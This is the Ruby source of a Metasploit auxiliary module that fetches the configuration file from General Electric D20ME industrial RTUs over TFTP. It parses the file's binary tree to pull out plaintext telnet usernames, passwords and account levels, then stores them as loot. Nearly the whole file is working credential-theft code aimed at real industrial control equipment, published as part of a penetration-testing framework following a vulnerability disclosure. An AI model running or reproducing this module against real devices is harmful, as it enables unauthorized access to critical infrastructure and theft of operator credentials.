
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

##
# This module grabs the device configuration from a GE D20M* RTU and
# parses the usernames and passwords from it.
##

require 'msf/core'
require 'rex/ui/text/shell'
require 'rex/proto/tftp'

class Metasploit3 < Msf::Auxiliary
  include Rex::Ui::Text
  include Rex::Proto::TFTP
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'General Electric D20 Password Recovery',
      'Description'    => %q{
        The General Electric D20ME and possibly other units (D200?) feature
        TFTP readable configurations with plaintext passwords.  This module
        retrieves the username, password, and authentication level list.
      },
      'Author'         => [ 'K. Reid Wightman <wightman[at]digitalbond.com>' ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Jan 19 2012'
      ))

    register_options(
      [
        Opt::RPORT(69),
        Opt::RHOST('192.168.255.1'),
        OptString.new('REMOTE_CONFIG_NAME', [true, "The remote filename used to retrieve the configuration", "NVRAM\\D20.zlb"])
      ], self.class)
  end

  def setup
    @rhost = datastore['RHOST']
    @rport = datastore['RPORT'] || 69
    @lport = datastore['LPORT'] || (1025 + rand(0xffff - 1025))
    @lhost = datastore['LHOST'] || "0.0.0.0"
    @rfile = datastore['REMOTE_CONFIG_NAME']
  end

  def cleanup
    if @tftp_client and @tftp_client.respond_to? :complete
      while not @tftp_client.complete
        select(nil,nil,nil,1)
        vprint_status "Cleaning up the TFTP client ports and threads."
        @tftp_client.stop
      end
    end
  end

  def rtarget(ip=nil)
    if (ip or rhost) and rport
      [(ip || rhost),rport].map {|x| x.to_s}.join(":") << " "
    elsif (ip or rhost)
      rhost
    else
      ""
    end
  end

  # Retrieve the file
  def retrieve
    print_status("Retrieving file")
    @tftp_client = Rex::Proto::TFTP::Client.new(
        "LocalHost" => @lhost,
        "LocalPort" => @lport,
        "PeerHost" => @rhost,
        "PeerPort" => @rport,
        "RemoteFile" => @rfile,
        "Action" => :download
    )
    @tftp_client.send_read_request { |msg| print_tftp_status(msg) }
    @tftp_client.threads do |thread|
      thread.join
    end
    # Wait for GET to finish
    while not @tftp_client.complete
      select(nil, nil, nil, 0.1)
    end
    fh = @tftp_client.recv_tempfile
    return fh
  end

  # Builds a big-endian word
  def makeword(bytestr)
    return bytestr.unpack("n")[0]
  end
  # builds abi
  def makelong(bytestr)
    return bytestr.unpack("N")[0]
  end

  # Returns a pointer.  We re-base the pointer
  # so that it may be used as a file pointer.
  # In the D20 memory, the file is located in flat
  # memory at 0x00800000.
  def makefptr(bytestr)
    ptr = makelong(bytestr)
    ptr = ptr - 0x00800000
    return ptr
  end

  # Build a string out of the file.  Assumes that the string is
  # null-terminated.  This will be the case in the D20 Username
  # and Password fields.
  def makestr(f, strptr)
    f.seek(strptr)
    str = ""
    b = f.read(1)
    if b != 0
      str = str + b
    end
    while b != "\000"
      b = f.read(1)
      if b != "\000"
        str = str + b
      end
    end
    return str
  end

  # configuration section names in the file are always
  # 8 bytes.  Sometimes they are null-terminated strings,
  # but not always, so I use this silly helper function.
  def getname(f, entryptr)
    f.seek(entryptr + 12) # three ptrs then name
    str = f.read(8)
    return str
  end

  def leftchild(f, entryptr)
    f.seek(entryptr + 4)
    ptr = f.read(4)
    return makefptr(ptr)
  end

  def rightchild(f, entryptr)
    f.seek(entryptr + 8)
    ptr = f.read(4)
    return makefptr(ptr)
  end

  # find the entry in the configuration file.
  # the file is a binary tree, with pointers to parent, left, right
  # stored as 32-bit big-endian values.
  # sorry for depth-first recursion
  def findentry(f, name, start)
    f.seek(start)
    myname = getname(f, start)
    if name == myname
      return start
    end
    left = leftchild(f, start)
    right = rightchild(f, start)
    if name < myname
      if left < f.stat.size and left != 0
        res = findentry(f, name, leftchild(f, start))
      else
        res = nil # this should perolate up
      end
    end
    if name > myname
      if right < f.stat.size and right != 0
        res = findentry(f, name, rightchild(f, start))
      else
        res = nil
      end
    end
    return res
  end

  # Parse the usernames, passwords, and security levels from the config
  # It's a little ugly (lots of hard-coded offsets).
  # The userdata starts at an offset dictated by the B014USERS config
  # offset 0x14 (20) bytes.  The rest is all about skipping past the
  # section header.
  def parseusers(f, userentryptr)
    f.seek(userentryptr + 0x14)
    dstart = makefptr(f.read(4))
    f.seek(userentryptr + 0x1C)
    numentries = makelong(f.read(4))
    f.seek(userentryptr + 0x60)
    headerlen = makeword(f.read(2))
    f.seek(userentryptr + 40) # sorry decimal
    entrylen = makeword(f.read(2)) # sorry this is decimal
    logins = Rex::Ui::Text::Table.new(
      'Header' => "D20 usernames, passwords, and account levels\n(use for TELNET authentication)",
      'Indent' => 1,
      'Columns' => ["Type", "User Name", "Password"])

    0.upto(numentries -1).each do |i|
      f.seek(dstart + headerlen + i * entrylen)
      accounttype = makeword(f.read(2))
      f.seek(dstart + headerlen + i * entrylen + 2)
      accountname = makestr(f, dstart + headerlen + i * entrylen + 2)
      f.seek(dstart + headerlen + i * entrylen + 2 + 22)
      accountpass = makestr(f, dstart + headerlen + i * entrylen + 2 + 22)
      if accountname.size + accountpass.size > 44
        print_error("Bad account parsing at #{dstart + headerlen + i * entrylen}")
        break
      end
      logins <<  [accounttype,  accountname,  accountpass]
      report_auth_info(
        :host => datastore['RHOST'],
        :port => 23,
        :sname => "telnet",
        :user => accountname,
        :pass => accountpass,
        :active => true
      )
    end
    if not logins.rows.empty?
      loot = store_loot(
        "d20.user.creds",
        "text/csv",
        datastore['RHOST'],
        logins.to_s,
        "d20_user_creds.txt",
        "General Electric TELNET User Credentials",
        datastore['RPORT']
      )
      print_line logins.to_s
      print_status("Loot stored in: #{loot}")
    else
      print_error("No data collected")
    end
  end

  def parse(fh)
    print_status("Parsing file")
    File.open(fh.path, 'rb') do |f|
      used = f.read(4)
      if used != "USED"
        print_error "Invalid Configuration File!"
        return
      end
      f.seek(0x38)
      start = makefptr(f.read(4))
      userptr = findentry(f, "B014USER", start)
      if userptr != nil
        parseusers(f, userptr)
      else
        print_error "Error finding the user table in the configuration."
      end
    end
  end

  def run
    fh = retrieve
    parse(fh)
  end

  def print_tftp_status(msg)
    case msg
    when /Aborting/, /errors.$/
      print_error [rtarget,msg].join
    when /^WRQ accepted/, /^Sending/, /complete!$/
      print_good [rtarget,msg].join
    else
      vprint_status [rtarget,msg].join
    end
  end
end
